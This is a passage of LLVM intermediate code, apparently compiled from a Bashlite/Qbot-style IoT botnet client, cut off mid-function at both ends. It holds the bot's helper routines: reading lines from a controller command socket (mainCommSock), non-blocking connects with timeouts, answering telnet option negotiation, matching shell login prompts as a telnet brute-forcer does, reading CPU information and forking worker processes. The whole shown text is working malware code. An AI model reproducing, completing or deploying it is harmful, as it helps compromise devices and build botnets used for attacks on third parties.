declare i32 @close(i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #3

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #0 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #5
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #5
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #5
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #5
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #5
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #5
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #5
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #5
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #5
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #3

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #5
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #0 {
  %3 = tail call i32 @inet_addr(i8* %0) #5
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #0 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #0 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #5
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #5
  %23 = call i32 @close(i32 %3) #5
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #5
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #0 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #5
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #5
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #4 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) local_unnamed_addr #0 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #5, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #5
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %32
  %.in = phi i32 [ %23, %32 ], [ %2, %.lr.ph.preheader ]
  %.027 = phi i32 [ %33, %32 ], [ 0, %.lr.ph.preheader ]
  %.02026 = phi i8* [ %30, %32 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #5
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %28, label %27

; <label>:27:                                     ; preds = %.lr.ph
  store i8 0, i8* %.02026, align 1
  br label %36

; <label>:28:                                     ; preds = %.lr.ph
  %29 = load i8, i8* %6, align 1
  %30 = getelementptr inbounds i8, i8* %.02026, i64 1
  store i8 %29, i8* %.02026, align 1
  %31 = icmp eq i8 %29, 10
  br i1 %31, label %._crit_edge.loopexit, label %32

; <label>:32:                                     ; preds = %28
  %33 = add nuw nsw i32 %.027, 1
  %34 = icmp sgt i32 %23, 1
  br i1 %34, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %28, %32
  %.0.lcssa.ph = phi i32 [ %.027, %28 ], [ %33, %32 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.0.lcssa = phi i32 [ 0, %3 ], [ %.0.lcssa.ph, %._crit_edge.loopexit ]
  %.1 = phi i8* [ %1, %3 ], [ %30, %._crit_edge.loopexit ]
  store i8 0, i8* %.1, align 1
  %35 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* %.1)
  br label %36

; <label>:36:                                     ; preds = %._crit_edge, %27
  %.021 = phi i32 [ -1, %27 ], [ %.0.lcssa, %._crit_edge ]
  ret i32 %.021
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #5
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #5
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #5
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #5, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #5
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #5
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #5
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #5
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #0 {
  %1 = tail call i32 @fork() #5
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #5
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #5
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #0 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #5
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #5
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #5
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

